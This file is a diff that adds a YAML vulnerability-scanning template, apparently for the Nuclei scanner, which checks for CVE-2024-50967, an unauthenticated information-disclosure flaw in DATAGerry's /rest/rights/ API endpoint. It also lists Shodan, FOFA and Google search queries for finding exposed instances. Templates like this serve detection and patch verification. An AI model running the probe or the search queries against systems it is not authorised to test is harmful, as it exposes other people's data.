@@ -1,0 +1,51 @@
+id: CVE-2024-50967
+
+info:
+  name: "DATAGERRY 不当访问控制漏洞"
+  author: s4e-io,0xByteHunter
+  severity: high
+  description: |
+    The /rest/rights/ REST API endpoint in Becon DATAGerry through 2.2.0 contains an Incorrect Access Control vulnerability. An attacker can remotely access this endpoint without authentication, leading to unauthorized disclosure of sensitive information.
+  reference:
+    - https://medium.com/@0xbytehunter/my-first-cve-discovery-of-broken-access-control-in-the-datagerry-platform-7b0404f88a43
+    - https://github.com/0xByteHunter/CVE-2024-50967
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-50967
+  classification:
+    cve-id: CVE-2024-50967
+    cwe-id: CWE-200
+    epss-score: 0.61765
+    epss-percentile: 0.98305
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: becon
+    product: datagerry
+    shodan-query: http.title:"datagerry"
+    fofa-query: title="datagerry"
+    google-query: intitle:"datagerry"
+  tags: datagerry
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/rights/"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"response_type":'
+          - '"model":'
+          - '"time":'
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502204c6873a8f4148c73dd1c86e371b9b0edb75793784c244d57f2dcd8d2dbb2300f022100b684def69c43a71e100798668eb6ac7ee330e533c73224ef71df8c31ca038645:922c64590222798bb761d5b6d8e72950
